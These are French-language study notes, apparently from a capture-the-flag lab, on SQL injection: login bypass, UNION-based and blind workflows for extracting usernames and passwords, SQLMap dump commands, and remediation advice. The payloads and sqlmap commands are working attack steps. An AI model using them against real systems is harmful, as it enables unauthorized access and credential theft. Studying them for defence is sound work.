### Concepts de base

**SQL Injection** : vulnérabilité causée par l'inclusion directe des entrées utilisateur dans des requêtes SQL sans validation/sanitation → l'attaquant peut lire, modifier ou supprimer des données, et contourner l'authentification.

**DBMS** : Database Management System — deux types :

|Type|Structure|Exemples|
|---|---|---|
|Relational|Tables, colonnes, lignes fixes|MySQL, PostgreSQL, SQLite, MSSQL|
|Non-Relational (NoSQL)|Flexible, pas de schéma fixe|MongoDB, Cassandra, ElasticSearch|

Structure relationnelle : DB → Tables → Colonnes (fields) + Lignes (records). La **primary key** est un ID unique par ligne, référençable entre tables.

---

### SQLi vulnerability

**Interaction app ↔ DB** : l'application construit une requête SQL avec les entrées utilisateur et l'envoie au DBMS.

**Exemple login normal** :

sql

```sql
SELECT * FROM users WHERE username='John' AND password='Un@detectable444';
```

→ succès seulement si username **ET** password match.

**Cause** : pas de validation/sanitation → un attaquant injecte du SQL dans un champ.

**Exemple bypass login** : password = `abc' OR 1=1;-- -`

sql

```sql
SELECT * FROM users WHERE username='John' AND password='abc' OR 1=1;-- -';
```

- `'` → ferme la chaîne du password
- `OR 1=1` → condition toujours vraie
- `--` → commente le reste de la requête

**Exemple bypass page privée** : `https://website.thm/blog?id=2;--`

sql

```sql
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

→ `;` termine la requête, `--` neutralise la condition `private=0`.

---

### SQL — Rappel syntaxe

sql

```sql
-- SELECT
SELECT * FROM users;
SELECT username, password FROM users;
SELECT * FROM users LIMIT 1;
SELECT * FROM users LIMIT 1, 1;        -- skip 1, retourne 1
SELECT * FROM users WHERE username = 'admin';
SELECT * FROM users WHERE username != 'admin';
SELECT * FROM users WHERE username = 'admin' OR username = 'jon';
SELECT * FROM users WHERE username = 'admin' AND password = 'p4ssword';
SELECT * FROM users WHERE username LIKE 'a%';   -- commence par 'a'
SELECT * FROM users WHERE username LIKE '%n';   -- finit par 'n'
SELECT * FROM users WHERE username LIKE '%mi%'; -- contient 'mi'

-- UNION (même nb de colonnes, types compatibles)
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;

-- INSERT / UPDATE / DELETE
INSERT INTO users (username, password) VALUES ('bob', 'password123');
UPDATE users SET username='root', password='pass123' WHERE username='admin';
DELETE FROM users WHERE username='martin';
DELETE FROM users;  -- supprime TOUT
```

---

### Types de SQLi

|Type|Feedback|Mécanisme|
|---|---|---|
|In-Band (Error-Based)|Messages d'erreur visibles|Erreurs DB dans le navigateur|
|In-Band (Union-Based)|Données dans la réponse|`UNION SELECT` injecté|
|Blind (Boolean-Based)|Vrai/faux uniquement|Réponse binaire de l'appli|
|Blind (Time-Based)|Délai de réponse|`SLEEP(x)` conditionnel|
|Out-of-Band|Canal externe|Requêtes HTTP/DNS sortantes vers l'attaquant|

---

### In-Band — Union-Based (workflow)

**1) Confirmer la SQLi** : injecter `'` → erreur SQL affichée = vulnérable.

**2) Trouver le nombre de colonnes** :

```
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3   ← pas d'erreur = 3 colonnes
```

**3) Forcer l'affichage du UNION** (ID invalide → première requête vide) :

```
0 UNION SELECT 1,2,3
```

**4) Récupérer le nom de la DB** :

sql

```sql
0 UNION SELECT 1,2,database()
```

**5) Lister les tables** :

sql

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

**6) Lister les colonnes** :

sql

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns WHERE table_name = 'staff_users'
```

**7) Extraire les données** :

sql

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

`group_concat()` : fusionne plusieurs lignes en une chaîne. `information_schema` : table système accessible à tous.

---

### Blind — Authentication Bypass

sql

```sql
SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

Injection dans le champ password : `' OR 1=1;--`

sql

```sql
SELECT * FROM users WHERE username='' AND password='' OR 1=1;
```

`OR 1=1` → toujours vrai → accès accordé.

---

### Blind — Boolean-Based (workflow)

Contexte : `https://website.thm/checkuser?username=admin` → `{"taken":true/false}`

**1) Trouver le nombre de colonnes** :

```
admin123' UNION SELECT 1;--          → false
admin123' UNION SELECT 1,2,3;--      → true ✓
```

**2) Trouver le nom de la DB (char par char)** :

sql

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--    → true → commence par 's'
-- continuer jusqu'à : sqli_three
```

**3) Énumérer les tables** :

sql

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables
WHERE table_schema = 'sqli_three' and table_name like 'a%';--
-- résultat : users
```

**4) Énumérer les colonnes** :

sql

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
-- exclure colonnes déjà trouvées :
... and COLUMN_NAME !='id';
-- colonnes : id, username, password
```

**5) Extraire les données** :

sql

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%'
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
```

Chaque caractère confirmé → le fixer, cycler sur le suivant.

---

### Blind — Time-Based (workflow)

`SLEEP(x)` s'exécute uniquement si le `UNION SELECT` est valide → délai = vrai, pas de délai = faux.

**Trouver le nombre de colonnes** :

sql

```sql
admin123' UNION SELECT SLEEP(5);--      → pas de délai → mauvais
admin123' UNION SELECT SLEEP(5),2;--    → 5s → 2 colonnes ✓
```

**Énumération** (même logique que Boolean-Based) :

sql

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

---

### Out-of-Band SQLi

Deux canaux distincts : requête web vers la cible (attaque) + requête HTTP/DNS vers machine contrôlée (collecte). Peu courante, dépend de fonctionnalités spécifiques activées sur le serveur DB.

Flux : payload SQLi → DB exécute → DB émet requête HTTP/DNS vers l'attaquant avec les données extraites.

---

### Remediation

**Prepared Statements (requêtes paramétrées)** : le développeur écrit la requête SQL en premier, les entrées utilisateur sont ajoutées comme paramètres séparés → la structure SQL ne peut pas être modifiée par l'input.

**Input Validation** : allow list pour restreindre les valeurs acceptées, ou remplacement des caractères non autorisés.

**Escaping User Input** : préfixer les caractères dangereux (`' " $ \`) par un backslash `\` → interprétés comme du texte brut, pas comme des opérateurs SQL.

---

### SQLMap

|Étape|Flags|Commande|
|---|---|---|
|Tester cible GET|`-u`|`sqlmap -u "http://site/page?id=1"`|
|Lister les bases|`--dbs`|`sqlmap -u "<url>" --dbs`|
|Lister les tables|`-D`, `--tables`|`sqlmap -u "<url>" -D users --tables`|
|Dump d'une table|`-D`, `-T`, `--dump`|`sqlmap -u "<url>" -D users -T thomas --dump`|

**Cas authentifié** : `--cookie="SESSIONID=..."` → tester dans le bon contexte (sinon redirections).

**POST-based** : intercepter la requête, sauvegarder en fichier → `sqlmap -r intercepted_request.txt`